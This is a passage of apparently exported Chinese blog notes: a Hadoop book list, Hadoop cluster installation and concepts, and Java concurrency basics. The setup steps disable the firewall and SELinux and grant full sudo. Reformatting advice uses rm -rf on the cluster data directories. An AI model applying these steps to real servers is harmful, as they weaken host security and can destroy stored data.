    <content type="text"><![CDATA[Hadoop框架体系相关书籍推荐1. [Hadoop权威指南] 第四版 顾名思义, 很权威 🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘 🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘🐘 2. [HBase权威指南] 祝你🐴到成功 🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴 🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴🐴 3. [Hive编程指南] 小蜜蜂, 嗡嗡嗡. 🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝 🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝 4. [zookeeper分布式过程协同技术详解] 这是个啥动物?? 🐱?? 🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱 🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱]]></content>
      <categories>
        <category>Hadoop</category>
        <category>Books</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>技术</tag>
        <tag>Hadoop</tag>
        <tag>Books</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hadoop学习笔记-1 简介&安装]]></title>
    <url>%2F2018%2F05%2F31%2FHadoop%2F0-Hadoop%2FHadoop%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1-%E7%AE%80%E4%BB%8B%26%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[引入面试题1. 有一个很大的(4T)的文件, 文件中存储的是ip, 每行存储一个, 要求求出出现此处最多的那个ip1234567891011121314151617181920212223242526272829303132333435如果这个文件是小文件： io流+集合 实现思路： 创建一个流进行文件读取 读取出来的数据存储到map集合中 key：ip value:次数 统计逻辑： 判断读取的ip是否已经存在在map中 存在：取出value+1 不存在：将ip作为key 1作为value 怎么求ip出现次数最多的 遍历map 遍历key，取出value找出最大值 value最大的key就是要找的ip我的文件足够大：大到一台机器装不下 数组 集合 变量------&gt;基于内存的 怎么办？？？？？ 服务器的2T 1.在最早的时候我们的思维模式就是纵向扩展，增加单个节点的性能 8T 摩尔定律：硬件性能18-24个月会提升一倍 4T------2h 4T------1h 前提是数据量不发生改变 但是往往数据量的变化速度远远大于服务器性能的提升速度 经过18个月 服务器性能提升了一倍 数据量------提升了10倍 4T------2h 40t-----20h 目前只需要10h 纵向扩展不可行？ 横向扩展：如果一台机器处理不了数据 使用多台机器 4T------2h 4t----4个机器----0.5小时 分而治之的思想： 一个机器计算性能有限 这个时候可以使用多台机器共同计算 每台机器承担一部分计算量 最终实现： 1.先将这个足够大的文件进行切分 切分成了多个小文件 2.将多个小文件分发给多个机器进行统计每个ip出现的次数 每个求出出现次数最多的ip 3.合并求出最终的最大值 2. 有两个很大的文件, 两个文件中存储的都是url, 求出两个文件中相同的url12345678910111213141516171819202122如果文件是小文件： io流+集合（set） 实现逻辑： 1.先创建两个文件读取流，用来读取两个文件 2.创建两个集合set1 set2 3.进行文件读取并分别set1 set2中 4.循环遍历其中一个set1，判断set1中取出的每个url是否在set2中 set2.contains(url)大文件的时候怎么办？ 我们也采用分而治之的思想：将两个大文件都进行切分，每个大文件都切成多个小文件 一个大任务=4*4个小任务 这样虽然可以达到目的但是效率太低？怎么办？ 排序，切分（规则同一） 最终将任务减少到4个 但是大文件排序仍然是一个非常消耗性能的事情，如果不需要排序就可做到这个效果尽量不要排序 怎么办？ hash算法的目的----》给每一个对象生成一个“唯一”的hash值0-Integer_MAX 是否可以运用hash算法解决这个问题 url.hashCode()%分段的个数 两个文件分段规则一定相同吗？ url.hashCode()肯定一样 分段个数一定相同吗？可以不一样 如果不一样的话 必须成倍数关系 最终的解决方案： 分而治之+分段规则 分段：分区 3. 有一个很小的文件, 存储的都是url, 每行一个, 怎样快速判断给定的一个url是否在这个文件中小文件: IO + 集合(set) 创建io 和 集合 进行文件读取放在 set集合中 set.contains(url) ==&gt; true:存在, false: 不存在 大文件: 思路1: 用hashCode() 进行分区, 然后用要查找的 url 取模定位 但是这样定位到了还是要一个个找 思路2: 数组的查询性能比较高, 数组可以通过下标 基数排序 数组的索引代表的是数据的原始值, 数组中存储的值, 是原始值出现的次数 放到对应下标的位置, 值只存出现的次数 如果数组中对应的下表存储的值为0, 代表此下标的值没有出现过, 就不需要输出 缺点: 数据范围过大时, 数组长度不好创建 数组的类型不好确定 如果数据比较分散时, 会造成资源浪费 练习: 写一个基数排序, 随机生成的20个数, 运用基数排序排序 对于本题 不需要统计次数, 存在标记为1, 不存在就是0 所以存的时候最好用boolean存, 用位数组 bit[] 可以设计多个hash算法, 用来校验某一种hashCode相同的情况 影响误判率3要素: hash算法个数 k - 数据量n - 数组长度 m 布隆过滤器 公式: k = 0.7*(m/n), 此时的误判率最小 大数据基本介绍数据 数据就是数值，也就是我们通过观察、实验或计算得出的结果。数据有很多种，最简单的就是数字。 数据也可以是文字、图像、声音等。数据可以用于科学研究、设计、查证等。 结构划分: 结构化 半结构化 非结构化 大数据特点: 4V 数据量大 1 Byte =8 bit1 KB = 1,024 Bytes = 8192 bit1 MB = 1,024 KB = 1,048,576 Bytes1 GB = 1,024 MB = 1,048,576 KB1 TB = 1,024 GB = 1,048,576 MB （普通用户数据级别）1 PB = 1,024 TB = 1,048,576 GB（企业级数据级别）1 EB = 1,024 PB = 1,048,576 TB1 ZB = 1,024 EB = 1,048,576 PB（全球数据总量级别） 数据增长速度快 数据种类多 文字 图片 音频 视频.. 数据的价值密度低 整体价值高 数据来源 公司中的自己的业务数据 淘宝 京东 第三方 爬虫 爬数据 数据处理 缺失数据的处理 考虑缺失数据是否影响整体的业务逻辑 不影响 删除 如果是和钱相关的数据 —-慎重 不能轻易删除 敏感数据 脱敏处理 – 加密 数据价值 人物画像 根据根据用户数据给用户做一个全方位的分析画像 属性： 人脉 消费水平 性格特点 …. 几个概念集群: 多个机器共同协作完成同一个任务, 每一个机器叫做节点, 多个机器共同组成的群体叫做集群 集群中的每个节点之间通过局域网或其他方式通讯 分布式: 分而治之 , 一个任务呗分成多个子任务模块, 每个任务跑在不同的节点上 原来一个人干的事情, 现在大家分工劳动 分布式的文件系统 , 分布式数据库, 分布式计算系统 负载均衡: Nginx 每个节点分配到的任务基本均衡 负载均衡是跟每个节点自身的配置等匹配的 不存在绝对的均衡 Hadoop概念 一个分布式的开源框架 支持成千上万的节点, 每个节点依靠本地的计算和存储 在应用层面提供高可用性 将硬件错误看成一个常态 Hadoop的模块 Common 支持其他 Hadoop 模块的公共实用程序 封装: 工具类, RPC框架 HDFS Hadoop的分布式文件系统, 负责海量数据的存储 将文件切分成指定大小的数据块并以多副本的存储形式存储在多个机器上 数据切分, 多副本, 容错等操作对用户是透明的 架构: 主从架构 ( Java进程) 主: namenode 一个 从: datenode 多个 助理: SecondaryNamenode 分担主进程的压力 YARN 集群的资源调度框架, 负责集群的资源管理 架构: 主从架构 主: ResourceManager – 负责统筹资源 从: NodeManager MapReduce 分布式计算框架, 有计算任务的时候才会有响应的进程 Hadoop的搭建搭建前的准备123456789101112131415161718192021222324252627282930313233343536373839404142搭建准备：1）ip配置2）主机名 vi /etc/sysconfig/network3）主机映射4）关闭防火墙和sellinux service iptables stop vi /etc/selinux/config SELINUX=disabled5）将系统的启动级别改为3 vi /etc/inittab6）创建普通用户，并为普通用户添加sudolers权限 创建用户：useradd 用户名 passwd 用户名 vi /etc/sudoers hadoop ALL=(ALL) ALL7）配置免密登录 先切换到普通用户 1）生成秘钥 ssh-keygen 2)发送秘钥 ssh-copy-id hadoop(主机名) 验证：ssh hadoop 8）安装jdk 卸载jdk： rpm -qa|grep jdk rpm -e java-1.7.0-openjdk-1.7.0.99-2.6.5.1.el6.x86_64 --nodeps9）时间同步 伪分布式不需要 分布式需要，必须做10)选择安装版本： 不选太陈旧的版本也不选最新的版本 2.7.6 11)安装 一定切换用户 普通用户 方式1: 伪分布式所有进程全部运行在同一个节点上 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162631）上传2）解压3）修改配置文件 配置文件的目录：HADOOP_HOME/etc/hadoop 需要修改6个配置文件： 1）hadoop-env.sh export JAVA_HOME=/home/hadoop/jdk1.8.0_73/ 2)core-site.xml 核心配置文件 &lt;property&gt; &lt;name&gt;fs.defaultFS&lt;/name&gt; &lt;value&gt;hdfs://hadoop:9000&lt;/value&gt; &lt;/property&gt; 3)hdfs-site.xml &lt;property&gt; &lt;name&gt;dfs.replication&lt;/name&gt; &lt;value&gt;1&lt;/value&gt; &lt;/property&gt; 4)yarn-site.xml &lt;property&gt; &lt;name&gt;yarn.nodemanager.aux-services&lt;/name&gt; &lt;value&gt;mapreduce_shuffle&lt;/value&gt; &lt;/property&gt; 5)mapred-site.xml &lt;property&gt; &lt;name&gt;mapreduce.framework.name&lt;/name&gt; &lt;value&gt;yarn&lt;/value&gt; &lt;/property&gt; 6)slaves 配置的是从节点的信息 7)配置环境变量 export JAVA_HOME=/home/hadoop/jdk1.8.0_73 export HADOOP_HOME=/home/hadoop/hadoop-2.7.6 export PATH=$PATH:$JAVA_HOME/bin:$HADOOP_HOME/bin:$HADOOP_HOME/sbin source /etc/rpofile 验证 hadoop version 8)先进行格式化 hadoop namenode -format 9)启动 start-all.sh 不建议 建议以下命令： start-dfs.sh start-yarn.sh 10）验证 jps 6个进程 3909 Jps 3736 ResourceManager 3401 DataNode 3306 NameNode 3836 NodeManager 3597 SecondaryNameNode 页面： hdfs：namenode的ip：50070 yarn:resourcemanager的ip：8088 方式2: 完全分布式参考文档 各个节点的安装的普通用户名必须相同 密码也得相同, 每个节点都需要操作 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879搭建准备： 1）ip配置 2）主机名 vi /etc/sysconfig/network 3）主机映射 4）关闭防火墙和sellinux service iptables stop vi /etc/selinux/config SELINUX=disabled 5）将系统的启动级别改为3 6）创建普通用户，并为普通用户添加sudolers权限 创建用户：useradd 用户名 passwd 用户名 vi /etc/sudoers hadoop ALL=(ALL) ALL 7）配置免密登录 先切换到普通用户 每台机器都需要执行下面的操作 各个节点之间都做一下 a. 生成秘钥 ssh-keygen b. 发送秘钥 ssh-copy-id hadoop(主机名) c. 验证：各个节点之间都需要做相互验证 ssh hadoop01 ssh hadoop02 ssh hadoop03 8）安装jdk 卸载jdk： rpm -qa|grep jdk rpm -e java-1.7.0-openjdk-1.7.0.99-2.6.5.1.el6.x86_64 --nodeps 9）时间同步 伪分布式不需要 分布式需要，必须做 1)不能联网的时候 手动指定 date -s 时间 或者手动搭建一个时间服务器 2）能联网的时候 找一个公网中的公用的时间服务器 所有节点的时间和公网中的时间服务器保持一致 ntpdate 公网的时间服务器地址 完全分布式必须要做 每个节点都需要执行 10) 选择安装版本： 不选太陈旧的版本也不选最新的版本 2.7.6 11) 安装 一定切换用户 普通用户 先在一个节点上执行所有的修改 在远程发送到其他节点 1）上传 2）解压d 3）配置环境变量 4）修改配置文件 6个配置文件 集群规划 .... .... 5)远程发送 scp -r hadoop-2.7.6 hadoop02:$PWD scp -r hadoop-2.7.6 hadoop03:$PWD scp -r /home/ap/apps/hadoop-2.7.6/etc/hadoop ap@cs1:/home/ap/apps/hadoop-2.7.6/etc 远程发送/etc/pofile 执行source /etc/pofile 6）进行格式化 必须在namenode的节点（hdfs的主节点） hadoop namenode -format 不配置目录默认/tmp 临时目录 可以随时回收的 7)启动 启动hdfs start-dfs.sh 在任意节点都可以 启动yarn start-yarn.sh 在yarn的主节点执行 jps命令查看 网页： hdfs: hadoop01:50070 yarn hadoop03:8088 8) 去掉警告（在/etc/profile或者 .bash_profile 或者 .zshrc中添加） export HADOOP_HOME_WARN_SUPPRESS=1 测试yarn集群是否启动成功 (提交MapReduce例子程序试跑) ls apps/hadoop-2.7.6/share/hadoop/mapreduce bin/hadoop jar hadoop-mapreduce-examples-2.6.5.jar pi 5 5 可能遇到的错误搭建过程中 主机找不到 /etc/sysconfig/network /etc/hosts 重启机器 何时化的时候报错 配置文件错误, 根据错误去相应文件进行调整, 修改完毕后, 重新格式化直到格式化成功 启动过程中某些进程启动不了措辞1: 暴力 全部关闭集群重新启动 stop-dfs.sh 在任意节点执行 stop-yarn.sh 在yarn的主节点启动 重新启动, 直接启动就可以了 start-dfs.sh start-yarn.sh 措施2: 单独启动某些进程单独启动hdfs的相关进程 hadoop-daemon.sh start hdfs 过程 hadoop-daemon.sh start namenode hadoop-daemon.sh start secondarynamenode 单独启动yarn的相关命令 yarn-daemon.sh start yarn 的相关过程 yarn-daemon.sh start resourcemanager ==搭建过程中的注意事项== 集群的只能成功的格式化一次, 不成功的要一直到格式化成功, 成功后就不能再次格式化 格式化的过程中: 创建出来namenode存储的相关目录 version文件: 记录仪集群的版本信息的, 每格式化一次, 就会产生一个新的版本信息 123456namespaceID=1163449973clusterID=CID-47f10077-2aef-4df6-a364-1a735515a100 #记录集群的版本信息的cTime=0storageType=NAME_NODEblockpoolID=BP-1527239677-192.168.75.162-1527817150436layoutVersion=-63 启动hdfs的时候: 生成datanode的相关数据信息 version: 记录datanode 相关版本的信息 1clusterID=CID-47f10077-2aef-4df6-a364-1a735515a100 两个文件中的clusterID相同的时候, datanode 才会认为是同一个集群的 想要重复格式化, 分3步走 停止所有服务 删除 namenode 的数据目录 rm -rf /home/ap/data/hadoopdata/name 删除 datanode 的数据目录 rm -rf /home/ap/data/hadoopdata/data 此时才可以重新格式化, 否则会造成 datanode 启动不了, 注意, 关闭防火墙, 关闭vpn 也可以一步到位 rm -rf /home/ap/data 再重新格式化 集群搭建过程中环境变量的配置(jdk. hadoop…) 在Linux中修改环境变量的地方有3个 /etc/profile 系统环境变量, 针对所有用户的 ~/.bashrc 用户环境变量 ~/.bash_profile 用户环境变量 这3个配置文件的加载顺序 /etc/profile &gt; .bashrc &gt; .bash_profile 生效: 最后一次加载的生效 时间同步问题 只要是完全分布式的, 多个节点之间一定要做时间同步, 目的: 要和 北京/上海 时间保持一致? no 集群背部各个节点之间时间保持一致 yes why ? 集群内部各个节点之间需要通信, 尤其是datanode 和 namenode之间, 他们之间的通信依靠心跳机制, 他们之间的心跳存在一个时间控制, 这个时间是 630s, 他们之前需要做时间同步 集群的安装模式1. 单机模式 直接解压的方式, 什么都不配置, 并且在一个节点上 没有分布式文件系统, 所有的文件都是来自本地, 只能对本地的文件进行读写 几乎没人用, 测试时偶尔会用 2. 伪分布式 可以看做跑在一个节点上的完全分布式 有分布式文件系统, 只不过这个文件系统只有一个节点 ==3. 完全分布式==参考文档 规划 目前疑点: NodeManager是根据什么配置到每台机器上的?? 根据表征, 可能是根据 slave文件 主机名 / IP HDFS YARN cts1 / 192.168.56.131 NameNode 空的 cts2 / 192.168.56.132 DataNode NodeManager cts3 / 192.168.56.133 DataNode + Secondary NameNode NodeManager cts4 / 192.168.56.134 DataNode NodeManager +ResourceManager hdfs 为例 : 在宏观看就是一个大的节点, 后台采用的硬件配置是三天机器的硬件配置之和, 但是对用户来讲完全感觉不到 在完全分布式中, 有主节点, 有从节点 主节点 namenode只有一个, 从节点有多个, 真实生产中, namenode会单独做一个节点 如果集群中namenode宕机, 整个集群还可以使用吗? 不可以 namenode: 主要作用存储元数据 (管理数据的数据, 存储的就是datanode存储数据的描述) datanode: 负责集群中真正处理数据存存储的 如果namenode 宕机, 集群无法使用, 这也是完全分布式的一大缺点, 存在单点故障问题 一般生产中不太使用, 学习, 测试, 节点个数比较少的时候, 有时候也会使用这种模式 节点数目越多, namenode宕机的可能性越大, 压力太大 助理secondarynamenode: 只是一个助理, 只是分担namenode的压力, 但是不能代替 架构: 一主多从 ==4. 高可用== 概念: 集群可以持续对外提供服务, 做到 7*24 小时不间断 依赖于zookeeper, 搭建放在 zookeeper课程之后 集群架构: 双主多从 有2个 namenode, 但是在同一时间只能有一个是 活跃的 namenode, 我们把这个活跃的namenode 成为 active 的, 另外一个是处理热备份状态, 我们将这个节点叫 standby, 但是2个主节点存储的元数据是一模一样的, 当 active namenode宕机的时候, standby的namenode 可以立马切换为 active 的namenode, 对外提供服务, 就可以做到 集群持续对外提供服务的功能 如果过一段时间, 宕机的 namenode 又活过来了, 宕机的 namenode 只能是变成 standby 的 缺陷: 在同一时间中, 集群中只有一个active 的 namenode, 也就是说 集群中有主节点能力的节点 只有一个, 如果集群中, 节点个数过多(1000) 的时候, 会造成namenode的崩溃, namenode存储的是元数据, 元数据过多的时候, 会造成namenode的崩溃(两个都崩溃), 没有真正的分担namenode 的压力 实际生产多使用高可用 5. 联邦机制 同一个集群中可以有多个主节点, 这些主节点的地位是一样的. 同一时间, 可以有多个活跃的 namenode 这些 namenode 共同使用集群中所有的 datanode, 每个namenode 只负责管理集群中的 datanode上的一部分数据 一般超大集群搭建的时候: 联邦 + 高可用 超大集群使用 每个namenode进行数据管理靠的Block Pool ID相同 不同的namenode管理的数据Block Pool ID 不同]]></content>
      <categories>
        <category>Hadoop</category>
        <category>hadoop</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>技术</tag>
        <tag>Hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hadoop体系概览]]></title>
    <url>%2F2018%2F05%2F31%2FHadoop%2F0-Hadoop%2FHadoop%E4%BD%93%E7%B3%BB%E6%A6%82%E8%A7%88%2F</url>
    <content type="text"><![CDATA[Hadoop核心组件整体直观概览 1. 分布式文件系统HDFS1.1 基本概念 将文件切分成指定大小的数据块并以多副本的存储形式存储在多个机器上 数据切分, 多副本, 容错等操作对用户是透明的 1.2 图示 1.3 HDFS架构 Datanode 定期向 Namenode 发 Hearbeat 元数据信息： 多份备份 1.4 HDFS的 IO 操作 上面的是读 客户端先向 NameNode 寻址 然后再找 DataNode 拿数据 下面的是写 HDFS 不支持修改， 没有 leader 角色， 不支持并发写， 只能支持非并发的追加 HBase 支持并发写和修改 删除： 删除的是元数据（索引信息） Datanode 会定期向 Namenode 发送心跳， 同步信息， 当 Namenode 发现 Datanode 上没有自己存储的信息时，就会把这部分信息删除掉。 1.5 HDFS 副本存放策略 复制因子为3时的 存放策略 如果写入者在一个 datanode 上， 则把一份拷贝放在本地机器上， 否则随机放到一个 datande 上 另一个副本放在不同的（远程）机架的节点上， 最后一个副本存放在同一个机架的不同节点上 这一策略削减了机架间的写入流量，通常提高了写入性能 复制因子大于3， 则随机确定第4个和其它的副本位置，同时将每个拷贝的数目保持在上限以下(基本上是(副本数 - 1) / racks + 2)。 2. 资源调度系统 YARN2.1 基本概念 YARN: Yet Another Resource Negotiator 负责整个集群资源的管理和调度 YAEN特点: 扩展性 &amp; 容错性 &amp; 多框架资源统一调度 2.2 图示 3. 分布式计算框架 MapReduce3.1 基本概念 源于Google的MapReduce论文, 论文发表于2004年12月 MapReduce是Google MapReduce的克隆版 MapReduce的特点: 扩展性 &amp; 容错性 &amp; 海量数据离线处理 3.2 图示 Hadoop优势1. 高可靠性 数据存储: 数据块多副本 数据计算: 重新调度作业计算 2. 高扩展性 存储/计算资源不够时, 可以横向的线性扩展机器 一个集群中可以包含数以千计的节点 3. 其它 存储在廉价机器上, 降低成本 成熟的生态圈 Hadoop的发展史见文章: Hadoop十年解读与发展预测 Hadoop官网 Hadoop生态系统1. 图示 2. 特点 开源, 社区活跃 囊括了大数据处理的方方面面 成熟的生态圈 Hadoop常用发行版及选型 Apache Hadoop CDH : Cloudera Distributed Hadoop （国内用的比较多） HDP : Hortonworks Data Platform 使用: CDH使用占比 60-70 hadoop: hadoop-2.6.0-cdh5.7.0 hive : hive-1.1.0-cdh5.7.0]]></content>
      <categories>
        <category>Hadoop</category>
        <category>hadoop</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>技术</tag>
        <tag>Hadoop</tag>
        <tag>hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java基础增强-2 并发编程]]></title>
    <url>%2F2018%2F05%2F30%2FJava%2FMyStudy%2FJava%E5%9F%BA%E7%A1%80%E5%A2%9E%E5%BC%BA-2%2F</url>
    <content type="text"><![CDATA[1. 多线程基本知识1.1 多线程运行的原理 原理：CPU 在线程中做时间片的切换。 一个(多核中的一个) CPU 在在运行程序的过程中某个时刻点上，只能运行一个程序。而 CPU 可以在 多个程序之间进行高速的切换 (轮询制)。而切换频率和速度太快，导致人的肉眼看不到。 1.2 实现线程的两种方式 继承 Thread 声明实现Runnable接口 还可以实现Callable接口 1.3 线程的状态图解 新建状态（New）：新创建了一个线程对象。 就绪状态（Runnable）：线程对象创建后，其他线程调用了该对象的 start()方法。该状态 的线程位于可运行线程池中，变得可运行，等待获取 CPU 的使用权。 运行状态（Running）：就绪状态的线程获取了 CPU，执行程序代码。 阻塞状态（Blocked）：阻塞状态是线程因为某种原因放弃 CPU 使用权，暂时停止运行。 直到线程进入就绪状态，才有机会转到运行状态。阻塞的情况分三种： 等待阻塞：运行的线程执行 wait()方法，JVM 会把该线程放入等待池中。(wait 会释 放持有的锁) 同步阻塞：运行的线程在获取对象的同步锁时，若该同步锁被别的线程占用，则 JVM 会把该线程放入锁池中。 其他阻塞：运行的线程执行 sleep()或 join()方法，或者发出了 I/O 请求时，JVM 会把 该线程置为阻塞状态。当 sleep()状态超时、join()等待线程终止或者超时、或者 I/O 处理完毕 时，线程重新转入就绪状态。（注意：sleep 是不会释放持有的锁） 死亡状态（Dead）：线程执行完了或者因异常退出了 run()方法，该线程结束生命周期。 1.4 几个重要的方法的区别： sleep(timeout)：当前线程进入阻塞状态，暂停执行一定时间，不会释放锁标记 join()：join()方法会使当前线程等待调用 join()方法的线程结束后才能继续执行 yield()：调用该方法的线程重回可执行状态，不会释放锁标记，可以理解为交出 CPU 时间片， 但是不一定有效果，因为有可能又被马上执行。该方法的真正作用是使具有相同或者更高优 先级的方法得到执行机会。 wait(timeout)：wait 方法通常和 notify()/notifyAll()搭配使用，当前线程暂停执行，会释放锁 标记。进入对象等待池。直到调用 notify()方法之后，线程被移动到锁标记等待池。只有锁 标记等待池的线程才能获得锁 1.5 Join的用法联合线程: 线程的join方法表示一个线程等待另一个线程完成后才执行。有人也把这种方式称为联合线程，就是说把当前线程和当前线程所在的线程联合成一个线程。join方法被调用之后，线程对象处于阻塞状态。 适用于A线程需要等到B线程执行完毕,再拿B线程的结果再继续运行A线程. 说人话: A线程需要拿到B线程的执行结果,才能继续往下. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081class Join extends Thread&#123; @Override public void run() &#123; for (int i = 0; i &lt; 50; i++) &#123; System.out.println("This is join: " + i); &#125; &#125;public class JoinThread &#123; public static void main(String[] args) throws InterruptedException &#123; System.out.println("begin..."); Join joinThread = new Join();//创建join线程对象 for (int i = 0; i &lt; 50; i++) &#123; System.out.println("main: " +i); if (i == 10)&#123; //启动join对象 joinThread.start(); &#125; if (i == 20)&#123; System.out .println("------------------------------------------"); joinThread.join();//在此处强制运行该线程 &#125; &#125; &#125;&#125; ===================执行结果===================begin...main: 0main: 1main: 2main: 3main: 4main: 5main: 6main: 7main: 8main: 9main: 10main: 11main: 12main: 13This is join: 0main: 14This is join: 1This is join: 2This is join: 3main: 15This is join: 4main: 16main: 17main: 18main: 19main: 20------------------------------------------This is join: 5This is join: 6This is join: 7This is join: 8This is join: 9This is join: 10......This is join: 44This is join: 45This is join: 46This is join: 47This is join: 48This is join: 49main: 21main: 22main: 23main: 24main: 25main: 26main: 27main: 28main: 29main: 30 2. Java同步关键词解释2.1. synchronized属于 JVM 级别加锁，底层实现是： 在编译过程中，在指令级别加入一些标识来实现的。 1. 锁对象注意点: 必须是锁的同一个对象 2. 锁获取和释放 锁的获取是由JVM决定的, 用户无法操作 锁的释放也是由JVM决定的 Synchronized 无法中断正在阻塞队列或者等待队列的线程。 3. 什么时候会释放 获取锁的线程执行完了该代码块，然后线程释放对锁的占有； 线程执行发生异常，此时 JVM 会让线程自动释放锁。 4.格式 1234// 加同步格式：synchronized(需要一个任意的对象（锁）)&#123; 代码块中放操作共享数据的代码。&#125; 5.线程执行互斥代码的过程 获得互斥锁 清空工作内存 从主内存拷贝变量的最新副本到工作内存 执行代码 将更新后的共享变量的值刷新到主内存 释放互斥锁 Lock -&gt; 主内存 -&gt; 工作内存 -&gt; 主内存 -&gt; unlock 2.2 Lock手动获取或释放锁, 提供了比 synchronized 更多的功能 Lock 锁是 Java 代码级别来实现的，相对于 synchronized 在功能性上，有所加强，主要是，公平锁，轮 询锁，定时锁，可中断锁等，还增加了多路通知机制（Condition），可以用一个锁来管理多 个同步块。另外在使用的时候，必须手动的释放锁。Lock 锁的实现，主要是借助于队列同 步器（我们常常见到的 AQS）来实现。它包括一个 int 变量来表示状态；一个 FIFO 队列，来 存储获取资源的排队线程。 基本使用 12345678910111213class X &#123; // 创建一把锁 private final ReentrantLock lock = new ReentrantLock(); // 需要做同步的方法 public void m() &#123; lock.lock(); //获取🔐, 加锁 try &#123; // 代码 &#125; finally &#123; lock.unlock(); // 释放🔐 &#125; &#125;&#125; 1. lock 和 synchronized 的区别 Lock 不是 Java 语言内置的，synchronized 是 Java 语言的关键字，因此是内置特性。Lock 是一个类，通过这个类可以实现同步访问； Lock 和 synchronized 有一点非常大的不同，采用 synchronized 不需要用户去手动释放锁， 当 synchronized 方法或者 synchronized 代码块执行完之后，系统会自动让线程释放对锁的占 用；而 Lock 则必须要用户去手动释放锁，如果没有主动释放锁，就有可能导致出现死锁现 象。 2. Lock 接口中方法的使用 ReentrantLock 类 ReentrantLock 是唯一实现了 Lock 接口的类，并且 ReentrantLock 提供了更多的方法，ReentrantLock，意思是“可重入锁”。 lock()、tryLock()、tryLock(long time, TimeUnit unit)、lockInterruptibly()是用来获取锁的。 unLock()方法是用来释放锁的。 四个获取锁方法的区别 lock()，阻塞方法，该方法是平常使用得最多的一个方法，就是用来获取锁。如果锁已被 其他线程获取，则进行等待。由于在前面讲到如果采用 Lock，必须主动去释放锁，并且在 发生异常时，不会自动释放锁。因此一般来说，使用 Lock 必须在 try{}catch{}块中进行，并 且将释放锁的操作放在 finally 块中进行，以保证锁一定被被释放，防止死锁的发生。 tryLock()，非阻塞方法，该方法是有返回值的，它表示用来尝试获取锁，如果获取成功， 则返回 true，如果获取失败（即锁已被其他线程获取），则返回 false，也就说这个方法无论 如何都会立即返回。在拿不到锁时不会一直在那等待。 tryLock(long time, TimeUnit unit)，阻塞方法，阻塞给定时长，该方法和 tryLock()方法是 类似的，只不过区别在于这个方法在拿不到锁时会等待一定的时间，在时间期限之内如果还 拿不到锁，就返回 false。如果一开始拿到锁或者在等待期间内拿到了锁，则返回 true。 lockInterruptibly()这个方法比较特殊，当通过这个方法去获取锁时，如果线程正在等待 获取锁，则这个线程能够响应中断，即中断线程的等待状态。也就使说，当两个线程同时通 过 lock.lockInterruptibly()想获取某个锁时，假若此时线程 A 获取到了锁，而线程 B 只有在等 待，那么对线程 B 调用 threadB.interrupt()方法能够中断线程 B 的等待过程。 2.3 Lock 与 synchronized 的选择 Lock 是一个接口，而 synchronized 是 Java 中的关键字，synchronized 是内置的语言实现； synchronized 在发生异常时，会自动释放线程占有的锁，因此不会导致死锁现象发生； 而 Lock 在发生异常时，如果没有主动通过 unLock()去释放锁，则很可能造成死锁现象，因 此使用 Lock 时需要在 finally 块中释放锁； Lock 可以让等待锁的线程响应中断，而 synchronized 却不行，使用 synchronized 时，等 待的线程会一直等待下去，不能够响应中断； 通过 Lock 可以知道有没有成功获取锁，而 synchronized 却无法办到。 Lock 可以提高多个线程进行读操作的效率。 2.4 读写锁 线程进入读锁的前提条件： 没有其他线程的写锁, 没有写请求或者有写请求，但调用线程和持有锁的线程是同一个 线程进入写锁的前提条件： 没有其他线程的读锁, 没有其他线程的写锁 ReentrantReadWriteLock 与 ReentrantLock 都是单独的实现，彼此之间没有继承或实现的关系。 ReadWriteLock 类123456// API// 可以区别对待读、写的操作public interface ReadWriteLock &#123; Lock readLock(); Lock writeLock();&#125; ReentrantReadWriteLock 类 ReentrantReadWriteLock 里面提供了很多丰富的方法，不过最主要的有两个方法：readLock()和 writeLock()用来获取读锁和写锁。 注意：不过要注意的是，如果有一个线程已经占用了读锁，则此时其他线程如果要申请写 锁，则申请写锁的线程会一直等待释放读锁。 如果有一个线程已经占用了写锁，则此时其他线程如果申请写锁或者读锁，则申请的线程 会一直等待释放写锁。 2.5 